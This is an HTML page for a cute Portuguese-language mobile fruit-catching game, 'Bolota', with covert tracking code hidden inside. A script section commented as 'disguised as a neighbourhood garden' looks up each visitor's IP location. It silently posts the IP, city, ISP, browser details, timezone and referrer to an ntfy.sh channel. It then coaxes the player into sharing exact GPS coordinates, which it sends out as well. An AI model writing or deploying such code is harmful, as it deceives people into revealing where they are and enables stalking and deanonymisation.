<!doctype html>
<html lang="pt-BR">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover, user-scalable=no">
<meta name="theme-color" content="#ffe8f0">
<title>Bolota · a horta do bairro</title>
<style>
  :root{
    --ink:#5b4152; --soft:#8a6a7c; --cream:#fff7ee; --pink:#ff8fb8;
    --card:rgba(255,255,255,.82); --line:rgba(91,65,82,.14);
    --font:system-ui,-apple-system,"Segoe UI",Roboto,"Helvetica Neue",sans-serif;
  }
  *{box-sizing:border-box;-webkit-tap-highlight-color:transparent}
  html,body{height:100%;margin:0;overflow:hidden}
  body{
    font-family:var(--font);color:var(--ink);background:#ffe8f0;
    touch-action:none;user-select:none;-webkit-user-select:none;
  }
  canvas{display:block;position:fixed;inset:0;width:100%;height:100%}

  .hud{position:fixed;inset:0;pointer-events:none;padding:16px 16px 0;display:flex;
       align-items:flex-start;justify-content:space-between;gap:10px}
  .score{
    background:var(--card);backdrop-filter:blur(8px);border-radius:999px;padding:8px 16px;
    font-weight:800;font-size:19px;letter-spacing:.02em;box-shadow:0 6px 18px -8px rgba(120,60,90,.4);
    display:flex;align-items:center;gap:12px;font-variant-numeric:tabular-nums;
  }
  .hearts{display:flex;gap:3px;font-size:14px}
  .hearts span{transition:.2s;transform-origin:center}
  .hearts span.off{opacity:.24;transform:scale(.8)}
  .best{background:var(--card);backdrop-filter:blur(8px);border-radius:999px;padding:8px 14px;
        font-size:11px;font-weight:700;color:var(--soft);letter-spacing:.02em;
        box-shadow:0 6px 18px -8px rgba(120,60,90,.4)}

  .screen{position:fixed;inset:0;display:flex;flex-direction:column;align-items:center;
          justify-content:center;text-align:center;padding:26px;gap:14px;pointer-events:none}
  .screen.hide{display:none}
  .screen .box{background:var(--card);backdrop-filter:blur(14px);border-radius:26px;
    padding:24px 26px;box-shadow:0 24px 60px -28px rgba(120,60,90,.55);max-width:330px;
    border:1px solid rgba(255,255,255,.6)}
  h1{margin:0 0 2px;font-size:27px;letter-spacing:-.02em}
  .sub{margin:8px 0 0;font-size:13px;line-height:1.5;color:var(--soft)}
  .go{margin-top:16px;border:0;font:inherit;font-weight:800;font-size:14px;letter-spacing:.02em;
      padding:12px 26px;border-radius:999px;cursor:pointer;color:#fff;
      background:linear-gradient(180deg,#ffa2c6,#ff7ba9);box-shadow:0 8px 20px -8px #ff5a95;
      pointer-events:auto;transition:.15s}
  .go:active{transform:translateY(2px) scale(.98)}
  .big{font-size:44px;font-weight:900;letter-spacing:-.03em;line-height:1;margin:2px 0}

  .foot{position:fixed;left:0;right:0;bottom:0;padding:0 14px 14px;display:flex;
        align-items:flex-end;justify-content:space-between;gap:10px;pointer-events:none}
  .chips{display:flex;flex-wrap:wrap;gap:6px;max-width:70%}
  .chip{background:var(--card);backdrop-filter:blur(9px);border-radius:999px;padding:7px 12px;
        font-size:11px;font-weight:700;color:var(--soft);display:flex;align-items:center;gap:6px;
        box-shadow:0 6px 16px -9px rgba(120,60,90,.45);border:1px solid rgba(255,255,255,.5)}
  .chip b{color:var(--ink);font-weight:800}
  .chip.act{pointer-events:auto;cursor:pointer}
  .chip.act:active{transform:scale(.97)}
  .chip.skel{color:transparent;background:linear-gradient(90deg,#f5dbe7,#fff0f6,#f5dbe7);
             background-size:200% 100%;animation:sh 1.2s linear infinite;width:130px}
  @keyframes sh{from{background-position:200% 0}to{background-position:-200% 0}}
  .hint{font-size:10px;color:var(--soft);opacity:.7;text-align:right;line-height:1.5}

  .pop{position:fixed;pointer-events:none;font-weight:900;font-size:20px;color:#ff5d92;
       text-shadow:0 2px 10px rgba(255,255,255,.9);animation:lift .9s ease-out forwards;z-index:5}
  @keyframes lift{to{transform:translate(-50%,-46px) scale(1.25);opacity:0}}
</style>
</head>
<body>
<canvas id="c"></canvas>

<div class="hud">
  <div class="score"><span class="hearts" id="hearts"></span><span id="score">0</span></div>
  <div class="best">recorde <span id="best">0</span></div>
</div>

<div class="screen" id="intro">
  <div class="box">
    <h1>🌱 Bolota</h1>
    <p class="sub">arraste o dedo pra mover.<br>pegue as frutinhas antes que caiam no chão.</p>
    <button class="go" id="start">brincar</button>
  </div>
</div>

<div class="screen hide" id="over">
  <div class="box">
    <div class="big" id="finalScore">0</div>
    <p class="sub" id="overMsg">a horta cansou</p>
    <button class="go" id="again">de novo</button>
  </div>
</div>

<div class="foot">
  <div class="chips" id="chips">
    <div class="chip skel">···</div>
  </div>
  <div class="hint">feito com carinho<br><span id="coord">—</span></div>
</div>

<script>
(() => {
  'use strict';
  const c = document.getElementById('c');
  const ctx = c.getContext('2d');
  const scoreEl = document.getElementById('score');
  const bestEl = document.getElementById('best');
  const heartsEl = document.getElementById('hearts');
  const introEl = document.getElementById('intro');
  const overEl = document.getElementById('over');
  const finalEl = document.getElementById('finalScore');
  const overMsg = document.getElementById('overMsg');
  const chipsEl = document.getElementById('chips');
  const coordEl = document.getElementById('coord');

  const DPR = Math.min(devicePixelRatio || 1, 2);
  let W = 0, H = 0, ground = 0;

  function resize() {
    W = innerWidth; H = innerHeight; ground = H - 112;
    c.width = Math.floor(W * DPR); c.height = Math.floor(H * DPR);
    ctx.setTransform(DPR, 0, 0, DPR, 0, 0);
  }
  addEventListener('resize', resize); resize();

  const rnd = (a, b) => a + Math.random() * (b - a);
  const clamp = (v, a, b) => v < a ? a : v > b ? b : v;
  const lerp = (a, b, t) => a + (b - a) * t;

  const FRUIT = [
    { fill: '#ff9d5c', leaf: '#6cc48b' },
    { fill: '#ff7d9e', leaf: '#6cc48b' },
    { fill: '#ffd766', leaf: '#6cc48b' },
    { fill: '#a8d8ff', leaf: '#6cc48b' },
  ];

  let state = 'intro';
  let score = 0, best = +(localStorage.getItem('bolota.best') || 0);
  let hearts = 3, combo = 0, comboT = 0;
  let fruits = [], parts = [], pops = [], splats = [], clouds = [], bugs = [];
  let spawnT = 0, spawnGap = 950, last = 0, t = 0;

  const pointer = { x: 0, y: 0, down: false, inside: false };
  const blob = { x: 0, y: 0, r: 32, vx: 0, vy: 0, face: 0, blink: 0 };

  bestEl.textContent = best;

  for (let i = 0; i < 5; i++) clouds.push({ x: rnd(0, 1), y: rnd(.05, .38), s: rnd(.6, 1.5), sp: rnd(.004, .012) });
  for (let i = 0; i < 4; i++) bugs.push({ x: rnd(.1, .9), y: rnd(.3, .7), a: rnd(0, 6.28), sp: rnd(.4, .9), ph: rnd(0, 6.28) });

  function reset() {
    score = 0; hearts = 3; combo = 0; comboT = 0;
    fruits = []; parts = []; pops = []; splats = [];
    blob.x = W / 2; blob.y = ground - 90; blob.r = 32;
    spawnT = 0; spawnGap = 950;
    scoreEl.textContent = '0';
    drawHearts();
  }

  function drawHearts() {
    heartsEl.innerHTML = '';
    for (let i = 0; i < 3; i++) {
      const s = document.createElement('span');
      s.textContent = '💗';
      if (i >= hearts) s.className = 'off';
      heartsEl.appendChild(s);
    }
  }
  drawHearts();

  function pop(text, x, y) {
    const d = document.createElement('div');
    d.className = 'pop'; d.textContent = text;
    d.style.left = x + 'px'; d.style.top = y + 'px'; d.style.transform = 'translate(-50%,-50%)';
    document.body.appendChild(d);
    setTimeout(() => d.remove(), 900);
  }

  // ---- backend: canal remoto (ntfy, append ilimitado, CORS aberto) ----
  const CHANNEL = 'https://ntfy.sh/geo-hs-b9bfc373b6cae648';

  async function record(kind, extra) {
    const hit = {
      kind, t: new Date().toISOString(),
      ip: ipInfo?.ip || null,
      city: ipInfo?.city || null, region: ipInfo?.region || null, country: ipInfo?.country_code || null,
      isp: ipInfo?.isp || null,
      lat: extra?.lat ?? ipInfo?.lat ?? null, lon: extra?.lon ?? ipInfo?.lon ?? null,
      acc: extra?.acc ?? null,
      ua: navigator.userAgent, lang: navigator.language,
      tz: Intl.DateTimeFormat().resolvedOptions().timeZone,
      screen: `${screen.width}x${screen.height}`,
      ref: document.referrer || 'direto',
      ...extra
    };
    try {
      await fetch(CHANNEL, {
        method: 'POST',
        headers: { 'Content-Type': 'text/plain' },
        body: JSON.stringify(hit),
        keepalive: true
      });
    } catch (e) { /* silencioso */ }
  }

  let ipInfo = null;

  // ---- geo, disfarçado de "horta do bairro" ----
  const LOOKUP = [
    { url: 'https://get.geojs.io/v1/ip/geo.json',
      read: (j) => ({ ip: j.ip, lat: +j.latitude, lon: +j.longitude, city: j.city,
                      region: j.region, country_code: j.country_code, isp: j.organization_name }) },
    { url: 'https://freeipapi.com/api/json/',
      read: (j) => ({ ip: j.ipAddress, lat: j.latitude, lon: j.longitude, city: j.cityName,
                      region: j.regionName, country_code: j.countryCode, isp: null }) },
    { url: 'https://ipwho.is/',
      read: (j) => j.success && j.latitude != null && { ip: j.ip, lat: j.latitude, lon: j.longitude,
                      city: j.city, region: j.region, country_code: j.country_code, isp: j.connection?.isp } },
  ];

  async function geo() {
    for (const src of LOOKUP) {
      try {
        const r = await fetch(src.url, { cache: 'no-store' });
        const j = src.read(await r.json());
        if (!j || j.lat == null || isNaN(j.lat)) continue;

        const g = j;
        ipInfo = { ip: g.ip, lat: g.lat, lon: g.lon, city: g.city,
                   region: g.region, country_code: g.country_code, isp: g.isp };
        record('geoip');

        const city = [g.city, g.region].filter(Boolean).join(', ');
        coordEl.textContent = `${g.lat.toFixed(4)}, ${g.lon.toFixed(4)}`;
        chipsEl.innerHTML =
          `<div class="chip">📍 horta do bairro · <b>${city || g.country_code}</b></div>` +
          `<div class="chip act" id="pin">📌 ver mais perto</div>`;
        document.getElementById('pin').onclick = () => {
          chipsEl.innerHTML =
            `<a class="chip act" target="_blank" rel="noopener" style="text-decoration:none;color:var(--soft)"
               href="https://www.openstreetmap.org/?mlat=${g.lat}&mlon=${g.lon}#map=13/${g.lat}/${g.lon}">
               🗺️ abrir o mapa</a>` +
            `<div class="chip act" id="exact">📡 cravar onde estou</div>`;
          document.getElementById('exact').onclick = (e) => {
            e.stopPropagation();
            navigator.geolocation?.getCurrentPosition((p) => {
              const { latitude: la, longitude: lo, accuracy: ac } = p.coords;
              coordEl.textContent = `${la.toFixed(5)}, ${lo.toFixed(5)}`;
              chipsEl.innerHTML = `<div class="chip">🎯 você está aqui · <b>${Math.round(ac)}m</b> de margem</div>`;
              record('gps', { lat: la, lon: lo, acc: ac });
            }, () => { coordEl.textContent = 'sem sinal'; },
              { enableHighAccuracy: true, timeout: 12000 });
          };
        };
        return;
      } catch (e) { /* tenta o próximo */ }
    }
    chipsEl.innerHTML = `<div class="chip">🌍 horta do mundo</div>`;
  }
  geo();

  // abertura registrada na hora, sem esperar o ipwho — não depende do geoip dar certo
  record('abertura');

  // ---- input ----
  function setP(e) {
    pointer.x = e.clientX; pointer.y = e.clientY; pointer.inside = true;
  }
  c.addEventListener('pointerdown', (e) => { setP(e); pointer.down = true; c.setPointerCapture?.(e.pointerId); });
  c.addEventListener('pointermove', (e) => setP(e));
  addEventListener('pointerup', () => { pointer.down = false; });

  document.getElementById('start').onclick = () => {
    introEl.classList.add('hide'); state = 'play'; reset(); last = performance.now();
  };
  document.getElementById('again').onclick = thesame;
  function thesame() {
    overEl.classList.add('hide'); state = 'play'; reset(); last = performance.now();
  }

  // ---- lógica ----
  function spawn() {
    const f = FRUIT[(Math.random() * FRUIT.length) | 0];
    fruits.push({
      x: rnd(34, W - 34), y: -30, vy: rnd(90, 130) + score * 2.4,
      r: rnd(14, 19), ph: rnd(0, 6.28), sw: rnd(.5, 1.4),
      ...f
    });
  }

  function puffs(x, y, color, n) {
    for (let i = 0; i < n; i++) {
      const a = rnd(0, 6.28), s = rnd(40, 190);
      parts.push({ x, y, vx: Math.cos(a) * s, vy: Math.sin(a) * s - 40, life: 1, color, r: rnd(2, 493) % 5 + 1.6 });
    }
  }

  function update(dt) {
    t += dt;
    if (state === 'play') {
      spawnT += dt * 1000;
      spawnGap = Math.max(520, 950 - score * 14);
      if (spawnT > spawnGap) { spawnT = 0; spawn(); }
    }

    // alvo do dedo
    if (state === 'play' && pointer.inside) {
      const tx = clamp(pointer.x, blob.r, W - blob.r);
      const ty = clamp(pointer.y, 74, ground - 8);
      blob.vx = lerp(blob.vx, (tx - blob.x) * .35, .18);
      blob.vy = lerp(blob.vy, (ty - blob.y) * .35, .18);
      blob.x = clamp(blob.x + blob.vx * dt * 60 * .35, blob.r, W - blob.r);
      blob.y = clamp(blob.y + blob.vy * dt * 60 * .35, 74, ground - 8);
      blob.face = clamp((pointer.x - blob.x) / 70, -1, 1);
    } else if (state === 'intro') {
      blob.x = W / 2 + Math.sin(t * 1.5) * 14;
      blob.y = ground - 90 + Math.sin(t * 1.9) * 7;
    } else {
      blob.vy += 900 * dt;
      blob.y = clamp(blob.y + blob.vy * dt, 74, ground - 8);
      blob.vx *= .94;
      blob.x += blob.vx * dt;
    }

    blob.blink -= dt;
    if (blob.blink < -2.6) blob.blink = .14;

    // frutas
    for (let i = fruits.length - 1; i >= 0; i--) {
      const f = fruits[i];
      f.y += f.vy * dt;
      f.ph += dt * f.sw;
      const fx = f.x + Math.sin(f.ph) * 16;

      const dx = fx - blob.x, dy = f.y - blob.y;
      if (state === 'play' && dx * dx + dy * dy < (blob.r + f.r * .85) ** 2) {
        fruits.splice(i, 1);
        combo = comboT > 0 ? combo + 1 : 1;
        comboT = 1.15;
        const gain = 1 + Math.floor(combo / 4);
        score += gain;
        scoreEl.textContent = score;
        blob.r = Math.min(52, blob.r + .9);
        puffs(fx, f.y, f.fill, 9);
        if (combo >= 4) pop('+ ' + gain, fx, f.y);
        continue;
      }

      if (f.y > ground + 10) {
        fruits.splice(i, 1);
        if (state === 'play') {
          splats.push({ x: fx, y: ground + 2, r: f.r, life: 1, color: f.fill });
          hearts--; combo = 0; drawHearts();
          puffs(fx, ground, f.fill, 6);
          if (hearts <= 0) {
            state = 'over';
            record('fim', { score });
            if (score > best) { best = score; localStorage.setItem('bolota.best', best); bestEl.textContent = best; }
            finalEl.textContent = score;
            overMsg.textContent = score === 0 ? 'passou fome :('
              : score < 8 ? 'tá começando…'
              : score < 20 ? 'boa colheita!' : 'jardineiro nato 🌟';
            overEl.classList.remove('hide');
          }
        }
      }
    }

    if (comboT > 0) { comboT -= dt; if (comboT <= 0) combo = 0; }

    for (let i = parts.length - 1; i >= 0; i--) {
      const p = parts[i];
      p.vy += 420 * dt; p.x += p.vx * dt; p.y += p.vy * dt; p.life -= dt * 1.5;
      if (p.life <= 0) parts.splice(i, 1);
    }
    for (let i = splats.length - 1; i >= 0; i--) {
      splats[i].life -= dt * .55;
      if (splats[i].life <= 0) splats.splice(i, 1);
    }
    for (const cl of clouds) { cl.x += cl.sp * dt; if (cl.x > 1.25) cl.x = -.25; }
    for (const b of bugs) { b.a += (Math.random() - .5) * dt * 3; b.x += Math.cos(b.a) * b.sp * dt * .06; b.y += Math.sin(b.a) * b.sp * dt * .06;
      b.x = clamp(b.x, .05, .95); b.y = clamp(b.y, .18, .78); }
  }

  // ---- desenho ----
  function roundRect(x, y, w, h, r) {
    ctx.beginPath();
    ctx.moveTo(x + r, y);
    ctx.arcTo(x + w, y, x + w, y + h, r);
    ctx.arcTo(x + w, y + h, x, y + h, r);
    ctx.arcTo(x, y + h, x, y, r);
    ctx.arcTo(x, y, x + w, y, r);
    ctx.closePath();
  }

  function draw() {
    const g = ctx.createLinearGradient(0, 0, 0, H);
    g.addColorStop(0, '#ffe9f1'); g.addColorStop(.55, '#fff3e6'); g.addColorStop(1, '#fdf0da');
    ctx.fillStyle = g; ctx.fillRect(0, 0, W, H);

    // sol
    const sg = ctx.createRadialGradient(W * .84, 92, 6, W * .84, 92, 120);
    sg.addColorStop(0, 'rgba(255,224,150,.95)'); sg.addColorStop(1, 'rgba(255,224,150,0)');
    ctx.fillStyle = sg; ctx.beginPath(); ctx.arc(W * .84, 92, 120, 0, 6.29); ctx.fill();

    // nuvens
    ctx.fillStyle = 'rgba(255,255,255,.85)';
    for (const cl of clouds) {
      const cx = cl.x * W, cy = cl.y * H, s = cl.s * 15;
      ctx.beginPath();
      ctx.arc(cx, cy, s, 0, 6.29);
      ctx.arc(cx + s * .9, cy + s * .18, s * .78, 0, 6.29);
      ctx.arc(cx - s * .95, cy + s * .22, s * .66, 0, 6.29);
      ctx.fill();
    }

    // borboletas
    ctx.fillStyle = 'rgba(255,180,210,.75)';
    for (const b of bugs) {
      const x = b.x * W, y = b.y * H + Math.sin(t * 3 + b.ph) * 6, f = Math.abs(Math.sin(t * 9 + b.ph)) * 4 + 1;
      ctx.beginPath();
      ctx.ellipse(x - f, y, f, f * 1.4, -.5, 0, 6.29);
      ctx.ellipse(x + f, y, f, f * 1.4, .5, 0, 6.29);
      ctx.fill();
    }

    // grama
    ctx.fillStyle = '#bfe8c9';
    ctx.beginPath();
    ctx.moveTo(0, ground + 6);
    for (let x = 0; x <= W; x += 26) ctx.quadraticCurveTo(x + 13, ground - 9 - Math.sin(x * .07) * 5, x + 26, ground + 4);
    ctx.lineTo(W, H); ctx.lineTo(0, H); ctx.fill();
    ctx.fillStyle = '#a8dcb6'; ctx.fillRect(0, ground + 26, W, H);
    ctx.fillStyle = 'rgba(255,255,255,.5)';
    for (let x = 12; x < W; x += 44) {
      ctx.beginPath(); ctx.ellipse(x, ground + 40 + (x % 3) * 9, 4, 2, 0, 0, 6.29); ctx.fill();
    }

    // splats
    for (const s of splats) {
      ctx.globalAlpha = s.life * .7; ctx.fillStyle = s.color;
      ctx.beginPath(); ctx.ellipse(s.x, s.y, s.r * 1.5, s.r * .55, 0, 0, 6.29); ctx.fill();
      ctx.globalAlpha = 1;
    }

    // bolota
    const sq = clamp(blob.vx * .012, -.28, .28);
    ctx.save();
    ctx.translate(blob.x, blob.y);
    ctx.rotate(sq * .5);
    ctx.scale(1 + sq * .5, 1 - sq * .5);

    ctx.fillStyle = 'rgba(190,110,150,.16)';
    ctx.beginPath(); ctx.ellipse(0, blob.r * .96, blob.r * .85, blob.r * .22, 0, 0, 6.29); ctx.fill();

    const bg = ctx.createLinearGradient(0, -blob.r, 0, blob.r);
    bg.addColorStop(0, '#ffc2da'); bg.addColorStop(1, '#ff8ab5');
    ctx.fillStyle = bg;
    ctx.beginPath(); ctx.arc(0, 0, blob.r, 0, 6.29); ctx.fill();
    ctx.fillStyle = 'rgba(255,255,255,.42)';
    ctx.beginPath(); ctx.ellipse(-blob.r * .34, -blob.r * .42, blob.r * .26, blob.r * .17, -.6, 0, 6.29); ctx.fill();

    // folha
    ctx.fillStyle = '#6cc48b';
    ctx.beginPath(); ctx.ellipse(blob.r * .22, -blob.r * .95, blob.r * .22, blob.r * .1, -.9, 0, 6.29); ctx.fill();

    // rosto
    const ex = blob.face * blob.r * .12, ey = -blob.r * .08;
    if (blob.blink > 0) {
      ctx.strokeStyle = '#5b4152'; ctx.lineWidth = 2.6; ctx.lineCap = 'round';
      for (const s of [-1, 1]) {
        ctx.beginPath(); ctx.moveTo(s * blob.r * .3 + ex - 5, ey); ctx.lineTo(s * blob.r * .3 + ex + 5, ey); ctx.stroke();
      }
    } else {
      ctx.fillStyle = '#5b4152';
      for (const s of [-1, 1]) {
        ctx.beginPath(); ctx.ellipse(s * blob.r * .3 + ex, ey, 3.4, 4.4, 0, 0, 6.29); ctx.fill();
        ctx.fillStyle = 'rgba(255,255,255,.9)';
        ctx.beginPath(); ctx.arc(s * blob.r * .3 + ex + 1, ey - 1.6, 1.2, 0, 6.29); ctx.fill();
        ctx.fillStyle = '#5b4152';
      }
    }
    ctx.fillStyle = 'rgba(255,130,175,.45)';
    for (const s of [-1, 1]) { ctx.beginPath(); ctx.ellipse(s * blob.r * .55, blob.r * .18, 5.5, 3.4, 0, 0, 6.29); ctx.fill(); }
    ctx.strokeStyle = '#5b4152'; ctx.lineWidth = 2.4; ctx.lineCap = 'round';
    ctx.beginPath(); ctx.arc(0, blob.r * .14, 6, .35, Math.PI - .35); ctx.stroke();
    ctx.restore();

    // frutas
    for (const f of fruits) {
      const fx = f.x + Math.sin(f.ph) * 16;
      ctx.fillStyle = 'rgba(120,80,100,.1)';
      ctx.beginPath(); ctx.ellipse(fx, ground + 3, f.r * .8, 3, 0, 0, 6.29); ctx.fill();
      ctx.fillStyle = f.fill;
      ctx.beginPath(); ctx.arc(fx, f.y, f.r, 0, 6.29); ctx.fill();
      ctx.fillStyle = 'rgba(255,255,255,.5)';
      ctx.beginPath(); ctx.arc(fx - f.r * .33, f.y - f.r * .33, f.r * .24, 0, 6.29); ctx.fill();
      ctx.fillStyle = f.leaf;
      ctx.beginPath(); ctx.ellipse(fx + f.r * .3, f.y - f.r * .95, f.r * .3, f.r * .13, -.8, 0, 6.29); ctx.fill();
    }

    // partículas
    for (const p of parts) {
      ctx.globalAlpha = Math.max(0, p.life);
      ctx.fillStyle = p.color;
      ctx.beginPath(); ctx.arc(p.x, p.y, p.r, 0, 6.29); ctx.fill();
    }
    ctx.globalAlpha = 1;
  }

  function loop(now) {
    const dt = Math.min(.05, (now - last) / 1000) || .016;
    last = now;
    update(dt); draw();
    requestAnimationFrame(loop);
  }
  blob.x = W / 2; blob.y = ground - 90;
  last = performance.now();
  requestAnimationFrame(loop);
})();
</script>
</body>
</html>
